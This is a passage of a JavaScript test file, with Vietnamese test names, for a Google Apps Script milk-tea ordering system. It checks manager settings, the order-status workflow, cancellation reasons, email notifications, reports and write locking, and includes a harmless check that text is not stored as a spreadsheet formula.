    { field: 'price', product_id: 'tra-sua-matcha', value: 1000 }, null, [], 'orders_open',
  ]) {
    assert.equal(env.save(change).error_code, 'INVALID_INPUT', JSON.stringify(change));
  }
  assert.equal(env.configValue('bank_account'), '');
  assert.equal(env.configValue('unit_label'), 'phần');
});

test('Cài đặt: ghi trong lock; lock bận thì không ghi', () => {
  const env = managerEnv();
  const sheet = env.sheets.get('Cấu hình');
  const store = sheet.store.bind(sheet);
  let writes = 0;
  sheet.store = (row, column, value) => {
    assert.equal(env.lockHeld, true, 'ghi Cấu hình phải trong lock');
    writes++;
    return store(row, column, value);
  };
  assert.equal(env.save({ field: 'max_cups', value: '500' }).ok, true);
  assert.equal(writes, 1);
  env.lockAvailable = false;
  assert.equal(env.save({ field: 'max_cups', value: '400' }).error_code, 'SERVER_ERROR');
  sheet.store = store;
  assert.equal(env.configValue('max_cups'), 500);
});

test('Trang nhập đơn: có ⚙ và ô mật khẩu; mật khẩu chỉ giữ trong bộ nhớ, không lưu trên máy hay URL', () => {
  const html = read('apps-script/Staff.html');
  assert.match(html, /id="open-settings"[^>]*aria-label="Cài đặt"/);
  assert.match(html, /id="manager-password" type="password"/);
  assert.match(html, /id="manager-lock"/);
  assert.match(html, /managerSave\(KEY, managerPassword, change\)/);
  assert.doesNotMatch(html, /document\.cookie|sessionStorage|history\.(push|replace)State|location\.(hash|search|href)\s*=/);
  for (const line of html.split('\n').filter((l) => /localStorage|remember\(/.test(l))) {
    assert.doesNotMatch(line, /password/i, line.trim());
  }
  assert.match(html, /if \(!settings\) remember\(STORAGE_TAB, name\)/, 'không nhớ mục Cài đặt');
});

/* ---------- Sửa sau review ---------- */

test('Cấu hình: ack đến sau khi ô đã được sửa thì không ghi dấu cũ, lần hỏng sau vẫn được báo', () => {
  const env = readyEnv();
  env.getJson();
  env.setConfig('call_threshold_cups', '');
  const pending = env.pending();
  assert.equal(pending.config_alert.alert, true);
  env.setConfig('call_threshold_cups', 5);
  assert.equal(env.ack({ codes: [], config_alert: pending.config_alert.signature }).ok, true);
  assert.equal(env.props.has('CONFIG_ALERTED'), false, 'không ghi dấu của lỗi đã sửa');
  env.setConfig('call_threshold_cups', '');
  assert.equal(env.pending().config_alert.alert, true, 'cùng lỗi hỏng lại vẫn được báo');
});

test('Cấu hình: ngưỡng cần gọi phải từ 1, để đơn tiền mặt nhỏ không bị coi là đơn lớn', () => {
  const env = readyEnv();
  env.getJson();
  env.setConfig('call_threshold_cups', 0);
  const created = env.staff(order(cups(1)));
  assert.equal(created.needs_call, false, 'dùng ngưỡng cũ 5');
  assert.match(env.pending().config_alert.messages[0], /"Ngưỡng đơn lớn cần gọi" phải từ 1 trở lên/);
});

test('Cài đặt: lưu xong trả menu, topping, phí ship và đơn vị để trang cập nhật', () => {
  const env = managerEnv();
  env.setConfig('unit_label', 'hộp');
  const saved = env.save({ field: 'product', product_id: 'tra-sua-matcha', active: false });
  assert.deepEqual(saved.config.products.map((p) => p.product_id), ['tra-sua-truyen-thong']);
  assert.equal(saved.config.toppings.length, 2);
  assert.equal(saved.config.unit_label, 'hộp');
  const fee = env.save({ field: 'shipping_fee_den_10km', value: '15000' });
  assert.equal(fee.config.shipping_fees.den_10km, 15000);
});

test('Cài đặt: ghi xong mà đọc lại lỗi thì vẫn báo đã lưu, kèm nhắc tải lại trang', () => {
  const env = managerEnv();
  const original = env.gs.currentStaffStatus_;
  env.gs.currentStaffStatus_ = () => { throw new Error('Sheets chập chờn'); };
  const result = env.save({ field: 'orders_open', open: false });
  env.gs.currentStaffStatus_ = original;
  assert.equal(result.ok, true);
  assert.equal(result.refresh_failed, true);
  assert.match(result.message, /Đã lưu.*Tải lại trang/);
  assert.equal(env.configValue('orders_open'), 'Đóng cửa');
  assert.equal(env.lockHeld, false);
});

test('email đơn mới: đơn của ngày khác ghi cả ngày dd/MM, đơn hôm nay chỉ ghi giờ', () => {
  const env = readyEnv();
  const old = env.post(order());
  const today = env.post(order());
  const twoDaysAgo = new Date(Date.now() - 2 * 24 * 3600 * 1000);
  env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === old.order_code, 'created_at', twoDaysAgo);
  const vn = new Date(twoDaysAgo.getTime() + 7 * 3600 * 1000).toISOString();
  const [email] = runWorkflow(env, () => {});
  const blocks = email.text.split('\n\n');
  const oldBlock = blocks.find((b) => b.startsWith(old.order_code));
  const todayBlock = blocks.find((b) => b.startsWith(today.order_code));
  assert.match(oldBlock, new RegExp(`lúc ${vn.slice(8, 10)}/${vn.slice(5, 7)} ${vn.slice(11, 16)}$`));
  assert.match(todayBlock, / lúc \d{2}:\d{2}$/);
});

/* ---------- Đổi trạng thái trên trang nhập đơn ---------- */

const act = (env, code, action, expected, extra = {}, key = STAFF_KEY) =>
  plain(env.gs.staffOrderAction(key, { order_code: code, action, expected_status: expected, ...extra }));
const rowOf = (env, code) => env.orderRows().find((r) => r.order_code === code);
const staffView = (env) => plain(env.gs.staffOpsLists(STAFF_KEY));

test('trạng thái: Đã gọi tích call_done, đơn rời Đang chờ và vào Chuẩn bị', () => {
  const env = readyEnv();
  const call = env.post(order(cups(5)));
  assert.deepEqual(staffView(env).held.map((h) => h.order_code), [call.order_code]);
  assert.deepEqual(staffView(env).held[0].actions, ['call_done', 'cancel']);
  assert.deepEqual(act(env, call.order_code, 'call_done', 'moi'), { ok: true, order_code: call.order_code, action: 'call_done' });
  assert.equal(rowOf(env, call.order_code).call_done, true);
  const view = staffView(env);
  assert.deepEqual(view.held, []);
  assert.equal(view.prep.lines[0].orders[0].order_code, call.order_code);
  assert.equal(env.lockHeld, false);
});

test('trạng thái: Đã nhận tiền đặt da_nhan, đơn vào Chuẩn bị', () => {
  const env = readyEnv();
  const transfer = env.staff(order({ payment_method: 'chuyen_khoan' }));
  assert.equal(act(env, transfer.order_code, 'paid', 'moi').ok, true);
  assert.equal(rowOf(env, transfer.order_code).payment_status, 'da_nhan');
  assert.deepEqual(staffView(env).prep.lines[0].orders.map((o) => o.order_code), [transfer.order_code]);
  assert.equal(act(env, transfer.order_code, 'paid', 'moi').error_code, 'STALE', 'bấm lại không ghi');
});

test('trạng thái: Đang làm vẫn ở Chuẩn bị với nhãn; Làm xong sang Giao hoặc tự lấy; Đã giao rời danh sách', () => {
  const env = readyEnv();
  const delivery = env.post(order(cups(1)));
  const pickup = env.post(order({ delivery_method: 'tu_lay', zone: '', address: '', ...cups(1) }));
  assert.deepEqual(staffView(env).prep.lines[0].orders[0].actions, ['start', 'finish', 'cancel']);

  assert.equal(act(env, delivery.order_code, 'start', 'moi').ok, true);
  let view = staffView(env);
  assert.deepEqual(view.prep.lines[0].orders.map((o) => [o.order_code, o.status, o.actions]), [
    [delivery.order_code, 'dang_lam', ['finish', 'cancel']],
    [pickup.order_code, 'moi', ['start', 'finish', 'cancel']],
  ]);

  assert.equal(act(env, delivery.order_code, 'finish', 'dang_lam').ok, true);
  assert.equal(act(env, pickup.order_code, 'finish', 'moi').ok, true, 'Làm xong được cả từ moi');
  view = staffView(env);
  assert.equal(view.prep.total_cups, 0);
  assert.deepEqual(view.delivery.zones[0].orders.map((o) => [o.order_code, o.actions]), [[delivery.order_code, ['deliver', 'bom', 'cancel']]]);
  assert.deepEqual(view.pickup.orders.map((o) => [o.order_code, o.delivery_method]), [[pickup.order_code, 'tu_lay']]);

  assert.equal(act(env, delivery.order_code, 'deliver', 'dang_giao').ok, true);
  assert.equal(act(env, pickup.order_code, 'deliver', 'dang_giao').ok, true);
  assert.equal(rowOf(env, delivery.order_code).status, 'xong');
  view = staffView(env);
  assert.equal(view.delivery.stops, 0);
  assert.deepEqual(view.pickup.orders, []);
  assert.equal(report(env).today.by_status.xong.orders, 2, 'báo cáo khớp ngay');
});

test('trạng thái: Bom từ đơn đang giao, suất vẫn tính; không bom được đơn chưa làm xong', () => {
  const env = readyEnv();
  env.setConfig('max_cups', 3);
  const first = env.post(order(cups(2)));
  assert.equal(act(env, first.order_code, 'bom', 'moi').error_code, 'STALE', 'chưa làm xong thì chưa bom');
  act(env, first.order_code, 'finish', 'moi');
  assert.equal(act(env, first.order_code, 'bom', 'dang_giao').ok, true);
  assert.equal(rowOf(env, first.order_code).status, 'bom');
  assert.equal(env.post(order(cups(2))).error_code, 'SOLD_OUT', 'đơn bom vẫn giữ suất');
});

test('trạng thái: Huỷ cần lý do, ghi huy và Lý do huỷ, trả lại suất; không xoá dòng', () => {
  const env = readyEnv();
  env.setConfig('max_cups', 3);
  const first = env.post(order(cups(2)));
  for (const extra of [{}, { cancel_reason: 'Lý do lạ' }, { cancel_reason: 'Khác' }, { cancel_reason: 'Khác', cancel_other: '   ' },
    { cancel_reason: 'Khác', cancel_other: 'x'.repeat(101) }]) {
    assert.equal(act(env, first.order_code, 'cancel', 'moi', extra).error_code, 'INVALID_INPUT', JSON.stringify(extra));
    assert.equal(rowOf(env, first.order_code).status, 'moi', 'không ghi khi thiếu lý do');
  }
  assert.equal(env.post(order(cups(2))).error_code, 'SOLD_OUT');
  assert.equal(act(env, first.order_code, 'cancel', 'moi', { cancel_reason: 'Nhập nhầm' }).ok, true);
  assert.equal(rowOf(env, first.order_code).status, 'huy');
  assert.equal(rowOf(env, first.order_code).cancel_reason, 'Nhập nhầm');
  assert.equal(env.orderRows().length, 1, 'dòng vẫn còn');
  assert.equal(env.post(order(cups(2))).ok, true, 'suất được trả lại');

  const other = env.staff(order(cups(1)));
  assert.equal(act(env, other.order_code, 'cancel', 'moi', { cancel_reason: 'Khác', cancel_other: '=Khách đổi ý' }).ok, true);
  assert.equal(rowOf(env, other.order_code).cancel_reason, 'Khác: =Khách đổi ý');
  assert.equal(env.sheets.get('Đơn hàng').formulas.length, 0, 'lý do không thành công thức');
});

test('trạng thái: đơn đã xong hoặc bom không huỷ được; bước không hợp lệ báo rõ và không ghi', () => {
  const env = readyEnv();
  const done = env.post(order(cups(1)));
  env.setOrderStatus(done.order_code, 'xong');
  const bom = env.post(order(cups(1)));
  env.setOrderStatus(bom.order_code, 'bom');
  for (const [code, status] of [[done.order_code, 'xong'], [bom.order_code, 'bom']]) {
    const result = act(env, code, 'cancel', status, { cancel_reason: 'Khách huỷ' });
    assert.equal(result.error_code, 'STALE');
    assert.equal(result.message, `Đơn ${code} đã đổi trạng thái, danh sách đã được làm mới.`);
    assert.equal(rowOf(env, code).status, status);
  }
  assert.equal(act(env, done.order_code, 'deliver', 'xong').error_code, 'STALE');
  const open = env.post(order(cups(1)));
  assert.equal(act(env, open.order_code, 'deliver', 'moi').error_code, 'STALE', 'chưa làm xong thì chưa giao');
  assert.equal(act(env, open.order_code, 'call_done', 'moi').error_code, 'STALE', 'đơn không cần gọi');
  assert.equal(act(env, open.order_code, 'xoa', 'moi').error_code, 'INVALID_INPUT');
  assert.equal(rowOf(env, open.order_code).status, 'moi');
});

test('trạng thái: mã không có thì INVALID_INPUT; sai khoá thì UNAUTHORIZED; yêu cầu sai thì không ghi', () => {
  const env = readyEnv();
  const created = env.post(order(cups(1)));
  assert.equal(act(env, 'TS-9999', 'start', 'moi').error_code, 'INVALID_INPUT');
  for (const key of ['sai', '', undefined, N8N_KEY]) {
    assert.equal(plain(env.gs.staffOrderAction(key, { order_code: created.order_code, action: 'start', expected_status: 'moi' })).error_code, 'UNAUTHORIZED');
  }
  for (const request of [null, [], {}, { order_code: created.order_code, action: 'start' }, { order_code: '', action: 'start', expected_status: 'moi' }]) {
    assert.equal(plain(env.gs.staffOrderAction(STAFF_KEY, request)).error_code, 'INVALID_INPUT', JSON.stringify(request));
  }
  assert.equal(rowOf(env, created.order_code).status, 'moi');
});

test('trạng thái: hai người cùng bấm trên một đơn thì chỉ một thao tác được ghi, người sau được báo làm mới', () => {
  const env = readyEnv();
  const created = env.post(order(cups(1)));
  const sheet = env.sheets.get('Đơn hàng');
  const store = sheet.store.bind(sheet);
  let writes = 0;
  sheet.store = (row, column, value) => {
    assert.equal(env.lockHeld, true, 'ghi trong lock');
    writes++;
    return store(row, column, value);
  };
  assert.equal(act(env, created.order_code, 'start', 'moi').ok, true);
  const second = act(env, created.order_code, 'start', 'moi');
  assert.equal(second.error_code, 'STALE');
  assert.match(second.message, /danh sách đã được làm mới/);
  // Người thứ hai thấy trang cũ (moi) và bấm Làm xong hoặc Huỷ: cũng không ghi.
  assert.equal(act(env, created.order_code, 'finish', 'moi').error_code, 'STALE');
  assert.equal(act(env, created.order_code, 'cancel', 'moi', { cancel_reason: 'Khách huỷ' }).error_code, 'STALE');
  sheet.store = store;
  assert.equal(writes, 1);
  assert.equal(rowOf(env, created.order_code).status, 'dang_lam');
  env.lockAvailable = false;
  assert.equal(act(env, created.order_code, 'finish', 'dang_lam').error_code, 'SERVER_ERROR');
  assert.equal(rowOf(env, created.order_code).status, 'dang_lam');
});

test('Huỷ: Sheet chưa có cột Lý do huỷ vẫn huỷ được; setup thêm cột không mất dữ liệu', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  const created = env.post(order({ name: 'Khách cũ', ...cups(1) }));
  const reasonColumn = sheet.cells[0].indexOf('Lý do huỷ');
  sheet.cells.forEach((row) => row.splice(reasonColumn, 1));
  assert.equal(act(env, created.order_code, 'cancel', 'moi', { cancel_reason: 'Hết hàng' }).ok, true);
  assert.equal(rowOf(env, created.order_code).status, 'huy');
  env.setup();
  assert.ok(headerRow(env, 'Đơn hàng').includes('Lý do huỷ'));
  assert.equal(rowOf(env, created.order_code).name, 'Khách cũ');
  const next = env.post(order(cups(1)));
  assert.equal(act(env, next.order_code, 'cancel', 'moi', { cancel_reason: 'Khách huỷ' }).ok, true);
  assert.equal(rowOf(env, next.order_code).cancel_reason, 'Khách huỷ');
});

test('email: đơn huỷ trước khi được báo thì không email và không ghi gì; email danh sách bỏ đơn huỷ', () => {
  const env = readyEnv();
  const mistake = env.staff(order(cups(1)));
  act(env, mistake.order_code, 'cancel', 'moi', { cancel_reason: 'Nhập nhầm' });
  assert.deepEqual(env.pending().orders, []);
  assert.equal(rowOf(env, mistake.order_code).notified_at, '', 'chỉ đọc, không ghi Đã báo');
  assert.deepEqual(runWorkflow(env, () => {}), [], 'không có email');

  const kept = env.post(order(cups(1)));
  const later = env.post(order(cups(1)));
  env.setOrderStatus(later.order_code, 'huy');
  const [email] = runWorkflow(env, () => {});
  assert.match(email.subject, /^🔔 1 đơn mới/);
  assert.match(email.text, new RegExp(kept.order_code));
  assert.doesNotMatch(email.text, new RegExp(`${later.order_code}|${mistake.order_code}`));
  const current = lists(env);
  assert.doesNotMatch(current.text, new RegExp(`${later.order_code}|${mistake.order_code}`));
  assert.equal(current.prep.total_cups, 1);
});

test('Đang chờ trên trang có đủ thông tin; n8n vẫn nhận bản ngắn', () => {
  const env = readyEnv();
  const call = env.post(order({
    name: 'Lan', phone: '0912345678', contact: 'https://facebook.com/lan', note: 'ít đá', address: '12 Nguyễn Trãi', ...cups(5),
  }));
  const [held] = staffView(env).held;
  assert.equal(held.order_code, call.order_code);
  assert.match(held.created_at, /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/);
  assert.equal(held.name, 'Lan');
  assert.equal(held.phone, '0912345678');
  assert.equal(held.contact, 'https://facebook.com/lan');
  assert.equal(held.items_text, '5 x Trà sữa truyền thống (mẫu)');
  assert.equal(held.cups, 5);
  assert.equal(held.delivery_method, 'giao');
  assert.equal(held.zone_label, 'Đến 10km');
  assert.equal(held.address, '12 Nguyễn Trãi');
  assert.equal(held.amount, 255000);
  assert.equal(held.payment_method, 'cod');
  assert.equal(held.reason, 'chờ gọi: đơn lớn, trả tiền mặt');
  assert.equal(held.call_reason, 'đơn lớn, trả tiền mặt');
  assert.equal(held.note, 'ít đá');
  const n8nHeld = lists(env).held[0];
  assert.equal(n8nHeld.name, undefined, 'payload n8n không thêm dữ liệu khách');
  assert.equal(n8nHeld.address, undefined);
});

test('chi tiết đơn: đủ thông tin, trạng thái và mọi nút hợp lệ; sai khoá hay sai mã thì từ chối', () => {
  const env = readyEnv();
  const created = env.staff(order({ name: 'Minh', note: 'không đường', ...cups(2) }));
  const detail = plain(env.gs.staffOrderDetail(STAFF_KEY, created.order_code));
  assert.equal(detail.ok, true);
  assert.equal(detail.order.order_code, created.order_code);
  assert.equal(detail.order.status, 'moi');
  assert.equal(detail.order.name, 'Minh');
  assert.equal(detail.order.note, 'không đường');
  assert.deepEqual(detail.order.actions, ['start', 'finish', 'cancel']);
  assert.ok(!JSON.stringify(detail).includes('submission_id'));
  env.setOrderStatus(created.order_code, 'xong');
  assert.deepEqual(plain(env.gs.staffOrderDetail(STAFF_KEY, created.order_code)).order.actions, []);
  assert.equal(plain(env.gs.staffOrderDetail(STAFF_KEY, 'TS-9999')).error_code, 'INVALID_INPUT');
  for (const key of ['sai', '', undefined, N8N_KEY]) {
    const denied = plain(env.gs.staffOrderDetail(key, created.order_code));
    assert.equal(denied.error_code, 'UNAUTHORIZED');
    assert.ok(!JSON.stringify(denied).includes('Minh'));
  }
});

test('Hôm nay: sau mật khẩu, cùng số liệu với báo cáo 22h; sai mật khẩu thì như Cài đặt', () => {
  const env = managerEnv();
  env.setConfig('call_threshold_cups', 100);
  env.setOrderStatus(env.post(order(cups(3))).order_code, 'xong');
  env.setOrderStatus(env.post(order(cups(1))).order_code, 'bom');
  env.post(order(cups(2)));
  const opened = env.open();
  const reportNow = report(env);
  assert.equal(opened.today.cups, reportNow.today.cups);
  assert.equal(opened.today.revenue, reportNow.today.revenue);
  assert.equal(opened.today.bom_rate_percent, reportNow.today.bom_rate_percent);
  assert.equal(opened.today.remaining_cups, reportNow.remaining_cups);
  assert.deepEqual(opened.today.by_status.map((s) => [s.label, s.orders, s.cups]), [['Mới', 1, 2], ['Xong', 1, 3], ['Bom', 1, 1]]);
  assert.match(opened.today.generated_at, /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}/);
  const refreshed = plain(env.gs.managerToday(STAFF_KEY, MANAGER_PASSWORD));
  assert.equal(refreshed.today.cups, 6);
  const wrong = plain(env.gs.managerToday(STAFF_KEY, 'sai'));
  assert.equal(wrong.error_code, 'UNAUTHORIZED');
  assert.equal(wrong.today, undefined);
  assert.equal(plain(env.gs.managerToday('sai', MANAGER_PASSWORD)).error_code, 'UNAUTHORIZED');
});

/* ---------- Sửa sau review đợt trạng thái ---------- */

test('email: đơn huỷ chưa báo rồi mở lại (về moi) thì vẫn được email; đọc pending không cần lock', () => {
  const env = readyEnv();
  const created = env.staff(order(cups(1)));
  act(env, created.order_code, 'cancel', 'moi', { cancel_reason: 'Khách huỷ' });
  env.lockAvailable = false;
  assert.deepEqual(env.pending().orders, [], 'pending đọc được khi lock bận');
  env.lockAvailable = true;
  assert.deepEqual(runWorkflow(env, () => {}), []);
  env.setOrderStatus(created.order_code, 'moi');
  const [email] = runWorkflow(env, () => {});
  assert.match(email.text, new RegExp(created.order_code));
  assert.ok(rowOf(env, created.order_code).notified_at);
});

test('email: has_more đếm theo danh sách đã bỏ đơn huỷ', () => {
  const env = readyEnv();
  env.setConfig('max_cups_per_phone_public', 1000);
  const made = [];
  for (let i = 0; i < 52; i++) made.push(env.post(order(cups(1))).order_code);
  env.setOrderStatus(made[0], 'huy');
  env.setOrderStatus(made[1], 'huy');
  const pending = env.pending();
  assert.equal(pending.orders.length, 50);
  assert.equal(pending.orders[0].order_code, made[2]);
  assert.equal(pending.has_more, false);
});

test('dấu danh sách: trạng thái và nút chỉ dành cho trang, không làm email gửi lại; Đang làm ở Chuẩn bị thì có', () => {
  const env = readyEnv();
  const held = env.staff(order({ payment_method: 'chuyen_khoan', ...cups(1) }));
  const prep = env.post(order(cups(1)));
  const first = lists(env);
  assert.equal(first.held[0].actions, undefined, 'n8n không nhận nút');
  assert.equal(first.held[0].status, undefined);
  assert.equal(first.prep.lines[0].orders[0].actions, undefined);
  env.post({ signature: first.signature }, { action: 'ops_lists_ack', key: N8N_KEY });

  env.setOrderStatus(held.order_code, 'dang_lam');
  const afterHeld = lists(env);
  assert.equal(afterHeld.signature, first.signature, 'đơn đang chờ đổi trạng thái: email không đổi');
  assert.equal(afterHeld.changed, false);

  act(env, prep.order_code, 'start', 'moi');
  const afterStart = lists(env);
  assert.notEqual(afterStart.signature, first.signature, 'email có thêm chữ đang làm');
  assert.match(afterStart.text, new RegExp(`${prep.order_code} đang làm`));
});

test('Cài đặt: lỗi khi tính số liệu hôm nay vẫn mở được, kèm câu ngắn', () => {
  const env = managerEnv();
  const original = env.gs.dailyReport_;
  env.gs.dailyReport_ = () => { throw new Error('Sheets chập chờn'); };
  const opened = env.open();
  env.gs.dailyReport_ = original;
  assert.equal(opened.ok, true);
  assert.ok(opened.settings);
  assert.equal(opened.today, null);
  assert.match(opened.today_error, /Chưa tính được số liệu hôm nay/);
});

test('trang nhập đơn nhận lý do huỷ, giới hạn chữ và thao tác cần xác nhận từ server', () => {
  const env = readyEnv();
  const html = env.get({ page: 'staff', key: STAFF_KEY }).content;
  assert.match(html, /var UI = \{"cancel_reasons":\["Khách huỷ","Nhập nhầm","Hết hàng","Khác"\],"cancel_other_max":100,"confirm_actions":\["cancel","bom","paid"\]\}/);
  assert.doesNotMatch(read('apps-script/Staff.html'), /'Khách huỷ'/, 'trang không giữ bản sao danh sách lý do');
});
